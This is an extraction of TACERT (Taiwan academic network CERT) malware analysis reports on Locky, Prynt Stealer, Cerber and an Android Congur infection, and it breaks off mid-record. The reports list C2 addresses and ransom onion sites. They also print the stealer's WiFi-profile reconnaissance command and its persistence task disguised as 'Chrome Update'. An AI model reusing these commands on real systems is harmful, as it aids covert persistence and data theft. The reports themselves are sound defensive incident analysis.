        "content": "個案分析- 新型態的加密勒索惡意程式 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/4  1 I. 事件簡介 1. 近年來惡意程式越來越多樣化,以往都只是感染主機成為中繼站或殭屍電 腦,但另一種的惡意程式卻會破壞使用者的檔案資料,並且勒索使用者相 當的金額,造成嚴重損害。 2. 近期內學術網路或相關組織信箱出現大量的APT 社交工程郵件,透過向關 議題進行誘騙開啟附加檔案。此例中的郵件主旨是要求檢查收款資訊,並 夾帶zip 的壓縮檔案。 3. 受害者往往必須向駭客以比特幣作為支付方式,贖回檔案的解密金鑰。 4. 本單位取得的惡意程式樣本進行研究分析,主要以Locky 變種的惡意勒索 軟體測試。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7(32 bit)系統進行隔離環境測試,若 使用64 位元系統則會測試失敗。 2. 惡意程式zip 解壓縮之後會有三個附檔名為 js 的檔案,雖然並非常見的 exe 執行檔,js 事實上是用javascript 撰寫的執行檔案。  2 3. 透過Virustotal 線上掃毒,該三個JS 執行檔病毒的檢測比例 3/57,為 新型態的加密勒索軟體,且偵測比例相當低。 4. 首先執行js 的檔案,系統會使用預設javascript 程式去執行,執行後一 段時候內系統會看不出任何異常現象,事實上惡意程式已經在背景執行 中。 5. 透過procexp 工具查看背景程式執行狀態,可以看到一隻位於隱藏路徑中 \\AppData\\Local\\Temp\\ 的sKQ3b8n90tdprRm.exe 惡意程式正在執行,而 該程式確實就是透過原本的js 檔案產生的。  3 6. 惡意程式最主要的行為之一就是會有對外的網路連線產生,因此查看該程 式 sKQ3b8n90tdprRm.exe 的網路狀態可以發現,確實有正在對外部 84.19.170.244 的網路連線,該IP ",
        "Page_Num": "1,2,3,4"
    },
    "433": {
        "File_Name": "個案分析-新型態的加密勒索惡意程式分析報告_10504.pdf",
        "content": "位址位於RU 俄羅斯國家。 7. 使用TCPview 查看所有網路連線狀態,也能觀察到該程式除了有對外IP 建立連線,也會針對內部網段其他IP 進行scan 動作,判斷為找尋可存取 的網路檔案進行檔案加密。 8. 當所有磁碟內部或外部的關聯檔案都被加密後,在桌面會跳出一個圖片檔 「_HELP_instructions.bmp」以及一個「_HELP_instructions.txt」說明 檔,主要內容是引導被害者如何進行繳付勒索贖金,此時發現所有可開啟 文件都已經無法開啟。  4 9. 此時隨意開啟資料夾查看原有文件檔,發現所有文件檔的確都被置換檔案 名稱以及副檔名為 locky,並附上一個贖金引導的txt 說明檔,其內容同 於黑底紅字的圖片內容。 10. 根據引導說明檔的內容操作,勒索的網址必須透過 Tor 的匿名網路瀏 覽器去開啟,無法使用一般DNS 解析出正常IP,而這是駭客很常用來規 避IP 追蹤的方法之一。 11. 此例開啟特殊onion 網域位址後看到至少經過三次的Relay IP,才轉 跳至未知的目的地 onion site。  5 12. 透過 Tor 瀏覽器成功開啟網址後,出現的是簡體中文的 Locky Decryptor 網頁,意思是受害者必須向該網站購買解密的金鑰程式,才能 還原被加密過的檔案,並且必須透過以比特幣作為支付方式,將0.5 BTC 付款至指定位址,大約是7000 台幣。 13. 駭客為了希望能夠勒索到比特幣,還特地提供一些網站,引導教學受害 者如何購買取得比特幣,根據受害者所在國家不同也有不同的取得方式。  6 14. 此變化型的加密勒索病毒不同於以往的案例,它不會要求必須在多久時 間內交付贖金,否則將會將贖金漲價或者銷毀金鑰,只是很單純的等待受 害者交付贖金。網站表示一旦收到贖金後,將會轉跳至下載解碼軟件的頁 面,然而此例並無真實測試過。 15. 因為比特幣的錢包地址具有完整的匿名性",
        "Page_Num": "4,5,6,7"
    },
    "434": {
        "File_Name": "個案分析-新型態的加密勒索惡意程式分析報告_10504.pdf",
        "content": "及不可被否認性,一旦支付出 去就無法追討回來,也無法知道帳號擁有者身分,所以現在很多犯罪組織 喜歡用比特幣作為交易工具。 16. 在所有檔案都被加密後,原本的惡意程式 js 檔案和 sKQ3b8n90tdprRm.exe 檔案也都會自我移除不留痕跡,透過Virustotal  7 掃描sKQ3b8n90tdprRm.exe 可以很清楚看到是高偵測比例46/57 的勒索 軟體,檢測名稱是 2.exe。 17. 從網路封包中可以看到,主機感染惡意程式一開始會連到烏克蘭的C&C 主機「46.8.44.39」,並且透過 HTTP POST 方式將加密內容送出,判定可 能是勒索加密的私鑰。 18. 當主機向上層C&C 報到並送出私鑰後,惡意程式開始對內部網路進行 netbios 的掃瞄,並嘗試針對能夠存取的共享資料夾進行加密,若有連接 網路磁碟或NAS 就有可能遭受破壞。  8 19. 此封包紀錄顯示惡意程式向同網段其他的主機 port 139 (netbios)嘗 試進行存取,然而因為該主機共享有設置登入密碼,因此訊息回覆public key 錯誤而沒有成功入侵。 III. 網路架構圖  9 受害者 檔案被加密勒索 APT 郵件 Javascript 檔案 C&C 烏克蘭 46.8.44.39:80 駭客 STEP 1 感染惡意程式 德國-中繼代理主機 81.7.10.93 STEP 4 Tor Browser 匿名網路 STEP 2 回傳加密私鑰 HTTP POST 贖金網站 32kl2rwsjvqjeui7.onion/ EC3737B6C31BE444 STEP 5 支付Bitcoin 0.5BTC STEP 6 接收Bitcoin STEP 7.1 解密私鑰贖回 持續監控主機 同網段主機 共享資料夾 STEP 3 Netbios Scan 加密存取檔案 發送APT郵件 STEP 7.2 解開加密檔案 1. 使用者透過APT 郵件攻擊感染Locky 的加密勒索病毒。 2. 主機感染後向烏克蘭的C&C 主機回傳加密的",
        "Page_Num": "7,8,9,10"
    },
    "435": {
        "File_Name": "個案分析-新型態的加密勒索惡意程式分析報告_10504.pdf",
        "content": "私鑰。 3. 感染主機開始向同網段的共享資料夾掃描存取並且加密檔案。 4. 受害者必須透過Tor Browser 進入洋蔥匿名網路,使用中繼代理主機。 5. 開啟了贖金網站,若是選擇付款則需要用Bitcoin 支付0.5BTC。 6. 駭客收到Bitcoin 贖金後理論上會將加密私鑰decryptor 給受害者。 7. 受害者可能夠利用駭客提供的私鑰decryptor 進行檔案解密還原。 IV. 建議與總結 1. 使用者透過APT 郵件遭受感染副檔名為 JS 的Locky 加密勒索病毒。 2. 主機一旦被感染後,惡意程式會開始加密本機磁碟和網路資料夾中的文件 檔、圖片檔和影音檔案。 3. 惡意程式一旦加密完各類檔案後會自我刪除,不讓使用者取得惡意程式。 4. 惡意程式隨後會跳出網頁和文件資訊,引導受害者如何去支付贖金來取得 解密私鑰。  10 5. Locky 病毒號稱使用RSA-2048 和AES-128 加密,因為沒有私鑰基本上是 無法救回檔案,建議使用者要定期備份重要資料避免無法挽回。 6. 理論上付了贖金給駭客,取得解密私鑰及工具就能解開,然而也無法保證 能成功救回檔案,可能導致檔案遺失又損失金錢。 7. 此病毒主要透過APT 郵件感染,有別於傳統的EXE 檔案,務必安裝防毒軟 體多能偵測抵擋此類病毒攻擊。 ",
        "Page_Num": "10,11"
    },
    "436": {
        "File_Name": "個案分析-新型態竊密軟體Prynt Stealer分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 新型態竊密軟體Prynt Stealer 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2022 年05 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 由ASEC 分析團隊每週惡意軟體數量統計顯示,發現近期竊密軟體持續排名 第一(70.3%)。統計學網中竊密軟體之資安事件數量,發現在2022/3~4 月資安 事件數量有上升趨勢。由此可見,竊密軟體的攻擊逐漸增多。 (資料來源:ASEC Weekly Malware Statistics) 2. 新型態之竊密軟體Prynt Stealer 有別於傳統只使用keylogger 來竊密。它提供 了強大的功能和額外的鍵盤記錄器和剪輯器模組。 3. 它的開發者採用以時間為單位的訂閱方式銷售該軟體,例如每月 100 美元, 也可用 900 美元終身買斷出售。它讓買家利用該軟體的builder 自行設定該 軟體之功能,來產生新Prynt Stealer 樣本。 4. 為了瞭解這個新型態之竊密軟體所具備之功能與攻擊行為,本中心對其樣本 進行分析。 二、 事件檢測 1. 首先,將樣本1283c.exe(MD5:ab913c26832cd6e038625e30ebd38ec2)放於一台 具有32 位元Windows 7 作業系統之主機上執行,執行後該樣本仍在原地未消 失。查看1283c.exe 之內容,發現其原始檔名為Prynt Stealer Reborn.exe。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 1283c.exe 執行後會使用cmd.exe 呼叫chcp.com、netsh.exe 與findstr.exe 等三 個程式來執行,之後再次呼叫自己執行一次(約45 秒後),最後則執行 schtasks.exe 來新增一個工作排程Chrome Update。 (1) 1283c.",
        "Page_Num": "1,2,3"
    },
    "437": {
        "File_Name": "個案分析-新型態竊密軟體Prynt Stealer分析報告.pdf",
        "content": "exe 執行後呼叫cmd.exe 來變更編碼方式為UTF-8,列出主機曾經 連接過的所有Wifi 資訊,並且快速搜尋主機的所有檔案內是否含有特殊 字串。 • chcp.com chcp 65001 將CMD 命令視窗編碼方式設定為UTF-8 編碼 • netsh.exe netsh wlan show profile 此命令可以列出主機曾經連接過的 所有 WiFi 網路配置資訊(記錄 WiFi 網路名稱)。 • findstr.exe findstr All 如同Windows 上的 grep (快速搜尋檔案),findstr 為用於在特定檔案中搜索特定字串的命令。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 接著再次呼叫cmd.exe 變更編碼方式為UTF-8 後,查詢當前掃描到的AP 資訊。(AP 為Wireless Access Point) • chcp.com chcp 65001 將CMD 命令視窗編碼方式設定為UTF-8 編碼 • netsh wlan show networks mode=bssid 查詢當前掃描到的AP 資訊 (3) 最後新增一個名為Chrome Update 排程來執行1283c.exe。 • schtasks.exe /create /f /sc ONLOGON /RL HIGHEST /tn “Chrome Update” /tr “...1283c.exe” 新增一個名為Chrome Update 之工作排程來 執行1283c.exe,該排程在每當使用者登入時就會以最高權限執行。 3. 在工作排程器發現一個新增排程Chrome Update,該排程在每次主機開機而 且使用者登入時,會以最高權限來執行1283c.exe。 4. 執行1283c.exe 後會重複執行著前述cmd.exe 命令行為,最後再次重複新增排 程chrome update,故這個排程的建立時間會在上次排程執行時間之後。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 1283c.exe 執行後在使用者AppData\\Local 資料夾內建立幾個隱藏資料夾,這 些資料夾名稱使用MD5 Hash 值命名。 6. 隱藏資料夾內會建立",
        "Page_Num": "3,4,5"
    },
    "438": {
        "File_Name": "個案分析-新型態竊密軟體Prynt Stealer分析報告.pdf",
        "content": "一個子資料夾,並使用「使用者名稱@主機名稱_語系代 碼」格式命名。 7. 在子資料夾中會建立4 個資料夾(Browsers、Directories、Grabber 與System 等),而這些資料夾用於保存從各個來源竊取到的資料。 整理隱藏資料夾內容如下圖所示。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢視「Browsers」資料夾,內有以瀏覽器命名之資料夾,在Google 資料夾內 有兩個檔案Downloads.txt 與History.txt。Downloads.txt 記錄該主機曾經下載 過之檔案,而History.txt 記錄該主機曾經瀏覽過的網站。此外,在Firefox 與 Opera 兩資料夾內皆存放Bookmarks.txt(書籤)與History.txt(瀏覽紀錄)兩個檔 案。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 檢視「Directories」資料夾,該資料夾主要用於獲取目錄結構並將其寫入文字 檔中。所針對的目錄包括最初用於複製資料的目錄。 (1) Desktop.txt 桌面所存檔案目錄結構與檔案路徑。 (2) Documents.txt 記錄Documents 文件夾所存檔案目錄。 (3) Downloads.txt 下載資料夾內所有檔案目錄。 (4) Pictures.txt 記錄Pictures 資料夾之檔案目錄。 (5) Startup.txt 記錄啟動資料夾之檔案目錄。 (6) Temp.txt 記錄在Temp 資料夾內的檔案目錄結構與檔案路徑。 (7) Videos.txt 記錄Videos 資料夾之檔案目錄。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 檢視「Grabber」資料夾,發現該惡意程式將主機使用者所屬「Desktop、 Documents、Downloads 與Pictures」等資料夾內特定檔案類型之檔案複製一 份存於此處,但僅複製等於或小於5KB 大小之檔案。例如: Five.txt (6KB)沒 有被複製,而Six.txt(5KB)有被複製。 11. 查看「System」資料夾,發現該惡意程式儲存",
        "Page_Num": "5,6,7,8"
    },
    "439": {
        "File_Name": "個案分析-新型態竊密軟體Prynt Stealer分析報告.pdf",
        "content": "有關運行中之程式資訊、網路 詳細資訊和受害者系統截圖等資料。 (1) Desktop.jpg 對受害主機桌面進行截圖。 (2) Process.txt 記錄受害主機執行中的背景程式內容。 (3) ProductKey.txt 記錄Windows 產品金鑰。 (4) ScanningNetworks.txt 記錄網路服務資訊。使用「/C chcp 65001 && netsh  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team wlan show networks mode=bssid」命令,獲取可用網路清單並保存到此txt 檔內。 (5) Windows.txt 記錄執行中的視窗程式資訊。 12. 1283C.exe 經Virustotal 檢測其惡意比例為56/69。 13. 查看主機對外連線狀態,發現1283c.exe 會對外連線3 個美國 IP(IP:104.18.115.97、172.67.160.130 與104.21.9.139)。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 14. 從封包分析發現,為了識別主機所使用之公用IP(Public IP),它會向 http[://]icanhazip.com (美國IP:104.18.115.97)發送請求,來取得公用IP 資訊。 15. 檢視IP:172.67.160.130 與104.21.9.139 之封包內容,發現兩個IP 對應到相同 網址https[://]api.mylnikov.org。與使用nslookup 查詢IP 與網址對應相同結果, 而且該網址經Virustotal 檢測為惡意網址。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 事件攻擊行為 由下圖攻擊行為示意圖可得知,駭客散播竊密軟體,一旦主機感染竊密軟 體後,開始呼叫cmd.exe 來執行資訊收集,並且將資訊存入隱藏資料夾 內。之後新增工作排程讓竊密軟體每次開機啟動,而最後會連線惡意網址。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. 竊密軟體Prynt Stea",
        "Page_Num": "8,9,10,11,12"
    },
    "440": {
        "File_Name": "個案分析-新型態竊密軟體Prynt Stealer分析報告.pdf",
        "content": "ler 是最近網路犯罪論壇上的新成員,具備多種功能。 它 不只是記錄受害者鍵盤輸入內容,它還會複製受害者主機內使用者的檔案, 將資料竊取走。它也會記錄目前受害主機程式運作狀態與網路資訊,以及對 主機桌面截圖。它的行為與目前學網中所看到的竊密軟體( 如Redline)著重側 錄使用者輸入內容有所不同。 2. 它除了竊取受害者的資料外,還可以使用剪輯器和鍵盤記錄操作進行財務盜 竊。此外,它也可以針對瀏覽器、VPN、FTP、通訊軟體和遊戲應用軟體等 進行資料竊取。 3. 由於它在每次開機時會以管理者權限自行啟動,建議在處理受害主機時應先 中斷Prynt Stealer 程式後再刪除Chrome Update 排程,最後再移除Prynt Stealer 程式。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 為避免遭受此軟體竊密,有下列幾點建議提供參考。 (1) 避免從不明來源網站下載盜版軟體,例如:一些網站提供的軟體工具可能 包含此類惡意軟體。 (2) 盡可能使用強密碼並執行多因素身份驗證來登入系統。 (3) 在電腦、手機和其他連網設備上開啟自動軟體更新功能。 (4) 在所用設備上安裝防毒軟體,並且定期更新病毒碼。 (5) 請勿在未驗證其真實性的情況下打開不受信任的連結和電子郵件附件。 (6) 監控校內對外網路是否有異常紀錄,以阻止惡意軟體洩露資料。 ",
        "Page_Num": "12,13"
    },
    "441": {
        "File_Name": "個案分析-會說話的加密勒索病毒Cerber Ransomware事件分析報告_10508.pdf",
        "content": "個案分析- 會說話的加密勒索病毒 Cerber Ransomware 事件分 析報告 TACERT 臺灣學術網路危機處理中心團隊製 2016/8  1 I. 事件簡介 1. 近年來加密勒索病毒盛行,市面上出現的ransomware 版本琳瑯滿目,台 灣的受害單位更不計其數,企業、政府或醫院都深受其害。 2. 除了一般企業會遭受加密勒索病毒攻擊,政府單位或學術單位也成為被攻 擊的對象,很多都是透過瀏覽器漏洞或APT 郵件感染。 3. 此類加密勒索共同點都是以比特幣為贖金的支付方式,因為比特幣的匿名 性可以輕易規避金流追查,更成為犯罪組織喜愛的使用方式。 4. 本單位取得近期標榜會說話的加密勒索病毒樣本進行研究分析,此版本病 毒已被破解能夠還原解密檔案。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7 系統進行隔離環境測試,惡意程式樣 本名稱為cerber.exe 的執行檔。 2. 原本的惡意程式會開始針對內部文件、影音、圖像檔案進行加密,然後惡 意程式主體就會自我刪除。 3. 當主機內部的文件檔案被加密完成之後,桌面背景會被置換成灰底白字的 警告文字,說明你的文件和其他檔案都已經被加密。  2 4. 系統會撥放一段語音,其內容為 “Attention! Attention! Attention! Your documents, photos, databases and other important files have been encrypted!”。 而這段語音的意思是,「注意!注意!注意!你的文件、照片、資料庫和 其他重要檔案都已經被加密!」 5. 此時檢查所有資料夾內文件,其檔案名稱都被更換為副檔名是cerber 的 加密文字。 6. 在所有被加密檔案的資料夾中皆會新增四個檔案,分別有html、txt、lnk 和vbs 檔案,都是告知使用者加密勒索的說明文件。  3 7. 執行並檢查vbs 內的程式碼得知,該檔案會使用迴圈播放十次關於檔案已 經被加密的警告語音。 8. 從txt 或html 文件檔中得知,該病毒名稱為",
        "Page_Num": "1,2,3,4"
    },
    "442": {
        "File_Name": "個案分析-會說話的加密勒索病毒Cerber Ransomware事件分析報告_10508.pdf",
        "content": "cerber ransomware,不像 其他加密勒索病毒,它並未顯示是使用何種加密演算法加密。但卻顯示該 惡意程式 cerber ransomware 已經從主機中移除,並且警告任何嘗試用 第三方的解密工具都可能毀壞已被加密的檔案。必須透過購買他們的解密 工具 decryptor 才能夠解救檔案。  4 9. 該說明文件提供很多的付款網域名稱,但大多名稱都無法正常解析出地 址,因此還是得用提供的匿名網路去解析,而該網域名稱會以 “http://XXXX.onion.to/識別碼”的形式出現,並透過 tor 洋蔥瀏覽器才 能登入。 10. 透過tor 登入付款頁面還會提供多國語言讓受害者選擇,表示駭客的目 標是世界各國主機。  5 11. 從Tor瀏覽器可以得知目前透過那些proxy節點進行連線到贖金支付伺 服器 http://27lelchgcvs2wpm7.onion/40B8-7CB3-C853-006D-FCF9 ,此 例中能夠看到至少透過三個IP 節點當作中繼跳板才能連到 onion site。 12. 在勒贖頁面中使用者必須支付320 美元的贖金來購買 cerber decryptor,並且以比特幣作為唯一支付方式,防止被追查到金錢流向。 一旦超過5 天付款期限,贖金將會提高至2 倍金額640 美元。  6 13. 駭客為了提高受害者完成支付贖金比率,還特地教學如何使用以及購買 比特幣,來完成購買駭客提供的解密軟體Cerber Decryptor。 14. 受害者若要支付贖金,還必須學會使用發送比特幣款項0.4917 BTC 至 駭客提供的錢包地址,並會顯示該錢包的支付狀態在網頁底下。  7 15. 除此之外為了取信受害者網站提供的 Cerber Decryptor 確實能夠還原 檔案,因此還免費解開一個檔案做驗證,也確實能夠還原檔案。 16. 幸運地是此cerber ransomware 在各大防毒軟體廠商努力下,已經成功 製作出免費的 Cerber Decryptor,有一定機率能夠成功解密還原檔案,",
        "Page_Num": "4,5,6,7,8"
    },
    "443": {
        "File_Name": "個案分析-會說話的加密勒索病毒Cerber Ransomware事件分析報告_10508.pdf",
        "content": "使用者可以到趨勢科技參考教學下載。 http://esupport.trendmicro.com/solution/zh-TW/1114221.aspx 17. 值得注意的是,因為一旦感染會產生短暫的對外udp 攻擊,封包此類型 的加密勒索軟體cerber ransomware,其特徵能有效的被學術網路的團隊 偵測到並且開立資安事件單。  8 18. 透過Virustotal 線上掃毒,該病毒的檢測比例為 44/53 ,其中有少數 幾間的防毒軟體判定為 cerber ransomware。 19. 測試惡意程式過程中,待所有檔案都被加密之後會執行cmd 一段指令 taskkill 和 del,將背景的cerber 程序和原始執行檔進行自刪除,確保 使用者找不到原始的程式樣本。  9 20. 透過cports 去紀錄惡意程式執行後的網路行為,可以看到程序 waitfor.exe 先對外部的 52.59.56.117 的port 80 進行TCP 連線。 21. 從封包紀錄中查看得知該IP 52.59.56.117 的網域名稱是 ipinfo.io, 一個能夠查詢自己主機外部IP 的一個網站,是惡意程式先將受感染主機 IP 資訊找出後回報給C&C 主機所用。 22. 接著惡意程式會開始對 31.184.234.0 和31.184.235.0 的網段port 6892 開始發送UDP 封包,該網段IP 位於烏克蘭,而此發送的UDP 封包就 是被偵測開立資安事件單的主要原因。  10 23. 檢查這些UDP 封包內容主要都是三個加密字串,可能是cerber 加密後 產出的私鑰,回傳給藏匿於該網段中的C&C 伺服器。 III. 網路架構圖 C&C藏匿於網段中 31.184.234.X :6892 受害使用者 ipinfo.io:80 美國 52.59.56.117 STEP 2 取得主機IP Cerber Ransomware 駭客 STEP 1 開啟惡意程式的 附加檔案 中繼代理主機 美國 38.229.70.61 STEP 4 Tor Browser 匿名網路 STEP 3 UDP方式 回傳加密私鑰 勒",
        "Page_Num": "8,9,10,11"
    },
    "444": {
        "File_Name": "個案分析-會說話的加密勒索病毒Cerber Ransomware事件分析報告_10508.pdf",
        "content": "贖網站 27lelchgcvs2wpm7.onion STEP 5 贖金及解密網 站 APT郵件攻擊 監控網站 1. 使用者可能透過APT 郵件攻擊開啟含有cerber 惡意程式的檔案。 2. 主機感染惡意程式後向網站「ipinf.io」取得IP 位址。 3. 惡意程式開始向31.184.234.0 網段發送含有密鑰的UDP 封包給C&C。 4. 受害者必須透過Tor 瀏覽器連到勒贖網站 27lelchgcvs2wpm7.onion。  11 5. 駭客要求受害者以比特幣方式支付贖金取得解密金鑰。 6. 現今已有破解的解密工具能夠免費在防毒軟體網站取得。 IV. 建議與總結 1. 使用者可能透過被APT 攻擊或網路下載執行到惡意程式而遭受感染,目前有 多數人回報是透過瀏覽器就莫名遭受感染,並未下載執行到可疑檔案。 2. 惡意程式感染主機後會開始加密所有磁碟中的文件檔、圖片檔和影音檔案。 3. 惡意程式一旦加密完文件檔案後會自我刪除,不讓使用者取得惡意程式。 4. 惡意程式隨後會更改系統桌面以及跳出灰底白字勒贖畫面,引導受害者如何 去支付贖金來取得解密私鑰。 5. Cerber 惡意程式與其他ransonware 最大不同處在於感染後會有人工語音的 提示。 6. 防毒軟體廠商雖已經破解製作出解密工具,但病毒也可能會持續進化變形, 建議使用者還是要定期備份重要資料避免無法挽回。 7. 建議使用者將系統重新安裝,避免病毒遺留的影響往後可能再次發生。 8. 建議使用者將作業系統更新,並且更新常用套件如Adobe Flash Player、 Adobe Reader、Java 等,這些漏洞都有可能導致感染類似的勒索程式。 ",
        "Page_Num": "11,12"
    },
    "445": {
        "File_Name": "個案分析-校園Android手機感染Congur病毒事件分析報告_10611.pdf",
        "content": "個案分析- 校園Android 手機感染 Congur 病毒事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年11 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 隨著網路的普及與手機的使用率升高,使得手機的資安問題越來越重要,而 在學術網路中,有許多學校提供學校師生無線上網的服務,因此,手機中毒 之資安事件比例逐漸升高。 2. 本中心在106 年5 月至今,陸續開出Andriod 系統感染Congur 病毒的資安事 件單,而從各校回覆的內容中發現,往往無法找到中毒裝置的使用者或找到 該中毒裝置的惡意連線行為之來源。 3. 從資安事件單的佐證資料顯示,該惡意行為的觸發皆會連到一個中國 IP:123.56.205.151:6280。 4. 今年6 月初在一間學校發現該資安事件單的中毒裝置使用者為一名學生,當 該學生透過學校Wifi 上網玩來自韓國的手機遊戲時會連線至中國IP。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 今年10 月在另一間學校發現此類型事件單之中毒裝置為桌上型電腦,該校有 多名學生安裝Android 模擬器於個人電腦並且上網玩遊戲,由此可知該類型 資安事件單的中毒裝置並非只有手機,有安裝Android 模擬器的電腦也有可 能中毒。 6. 統計此類型資安事件在106 年5-10 月的觸發次數,發現此類資安事件共有 496 件,而且有越來越多的趨勢,需要加強防範此類事件的發生。 7. 分析此類型資安事件在106 年5-10 月所觸發的單位,發現大專院校佔大多 數,其次是高中職與國民中小學,可能因有提供Wifi 服務的學校以大專院校 居多導致。 8. 為了釐清是否因來自韓國的手機遊戲觸發Congur 的資安事件單,本中心進行 模擬檢測。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team II",
        "Page_Num": "1,2,3,4"
    },
    "446": {
        "File_Name": "個案分析-校園Android手機感染Congur病毒事件分析報告_10611.pdf",
        "content": ". 事件檢測 1. 首先,將IP:123.56.205.151:6280 送至VirusTotal 檢測,發現此IP 被防毒 軟體公司檢測出為惡意的比例不高,僅2/64,但該IP 被Fortinet 公司列為 Malware site。 下圖的網址列表是VirusTotal 提供與中國IP(123.56.205.151:6280)有關係 而被偵測到的惡意網址,事實上,從我們所側錄到的封包內容也可以看出該 款遊戲有連到這些網址的行為。 2. 經查IP:123.56.205.151 目前被Fortinet 公司和AlienVault 公司列入IP 黑名單中,判斷可能曾經被用來作為Android Congur Botnet C2 Server。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 從下圖我們可以看出與中國IP 有關聯的網址有哪一些,而這些網址在稍後我們 所側錄到的封包內容中也有看到。另外,從下圖我們可以知道Google 的安全瀏 覽是不存在的。 3. 透過使用 Win7(x64)系統的 VM 主機進行隔離測試,並且安裝Android 系統 模擬器BlueStacks 軟體於VM 主機內。 4. 在Google play 商店內搜尋韓國的手機遊戲(簡稱:遊戲A),發現該遊戲已有  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 500 萬下載次數,可見此款遊戲使用者眾多。 5. 查看遊戲A 的存取權限,發現所開啟的權限隱藏洩漏個人隱私的安全疑慮, 例如:可讀取、修改或刪除USB 儲存裝置的內容、尋找裝置上的帳戶、手機概 略位置...等等。 6. 使用MOBSF(Mobile-Security-Framework)工具檢測遊戲A,發現在Android 權限方面有多個權限項目存在風險,詳列如下: NO 權限 狀態 資訊 1 android.permission.READ_EXTERNAL_STORAGE 危險 讀取SD 卡內容 2 Android.permission.INTERNET 危險 完全存取網際網路 3 Com.google.android.c2dm.permission.RECEIVE 危險 來自android ",
        "Page_Num": "4,5,6"
    },
    "447": {
        "File_Name": "個案分析-校園Android手機感染Congur病毒事件分析報告_10611.pdf",
        "content": "參考的 未知權限  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 權限 狀態 資訊 4 Android.permission.ACCESS_COARSE_LOCATION 危險 存取手機大概位置 5 Android.permission.WAKE_LOCK 危險 防止手機進入睡眠 6 Android.permission.GET_TASKS 危險 檢索執行中的應用 程式來發現隱私資 訊 7 Android.permission.READ_PHONE_STATE 危險 讀取手機的狀態與 識別碼 8 Android.permission.WRITE_EXTERNAL_STRAGE 危險 讀取/修改/刪除SD 卡內容 9 Com.android.vending.BILLING 危險 來自android 參考的 未知權限 7. 使用MOBSF 工具檢測遊戲A,發現在惡意程度分析方面存在四個問題,分別 敘述如下:  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team NO 問題 嚴重 性 說明 1 應用程式資料可 以備份,Flag 遺失 中 該Flag 應該設置為false。 默認情況下,它 被設置為true,並允許任何人通過adb 備份 您的應用程式資料。它允許使用USB 偵錯來 複製應用程式資料的使用者關閉裝置。 2 內容提供者不受 保護 高 發現內容提供者被設備上的其他應用程式共 享,因此設備上的任何其他應用程式都可以 存取內容提供者。 3 廣播接收器不受 保護 高 發現廣播接收器被設備上的其他應用程式共 享,因此設備上的任何其他應用程式都可以 存取廣播接收器。 4 廣播接收器不受 保護。存在一個有 意圖的過濾器。 高 發現廣播接收器被設備上的其他應用程式共 享,因此設備上的任何其他應用程式都可以 存取它。有意圖過濾器的存在表明廣播接收 器被明確地導出。 8. 使用MOBSF(Mobile-Security-Framework)工具檢測遊戲A,在Android Library Binary 分析方面,發現elf 建立沒有堆疊保護,會大大增加利用堆 疊緩衝區溢出的難度,因為它迫使攻擊",
        "Page_Num": "6,7,8"
    },
    "448": {
        "File_Name": "個案分析-校園Android手機感染Congur病毒事件分析報告_10611.pdf",
        "content": "者通過一些非傳統手段(例如破壞堆 疊上的其他重要變數)來獲得對指令指針的控制,屬於高嚴重等級。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 在Android 系統模擬器BlueStacks 內安裝遊戲A,發現當開啟遊戲A 時,會 有連線中國IP:123.56.205.151:6280 的連線行為產生,而且當此遊戲A 執行 期間其連線次數頻繁,當遊戲A 被關閉後,則會每隔一段時間連線至中國IP, 此連線行為如同執行一個後門程式來定期連至某一個IP。另外,也發現在遊 戲A 開始執行時,會有短暫一、兩次連至中國IP:123.56.206.59:7878 之連 線行為。 10. 透過VirusTotal 網站檢測 IP:123.56.206.59,發現該IP 被Fortinet 公司 視為Malware site。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 檢視側錄的封包內容,發現Android 系統模擬器會連到中國 IP:123.56.206.59:7878 去取得資料,所取得資料內容為伺服器位 置:http://123.56.205.151:6280 與下載位置: http://123.56.205.151:6280。 接著它便會連線到IP:123.56.205.151:6280 去上傳資料,  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team IP:123.56.205.151:6280 (Server: Goliath)會回應請求成功,並且傳送資 料給Android 系統模擬器。之後,Android 系統模擬器會陸陸續續每隔一段 時間連到IP:123.56.205.151:6280 去上傳資料。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 從Avgthreat Lab 所出的Android App 報告內容,得知遊戲A 為活動中的惡 意程式,而且被偵測到內含兩個惡意子程式。 這些惡意子程式會中斷手機的運作與竊取使用者的個人資訊,也會注入代碼 來",
        "Page_Num": "8,9,10,11,12"
    },
    "449": {
        "File_Name": "個案分析-校園Android手機感染Congur病毒事件分析報告_10611.pdf",
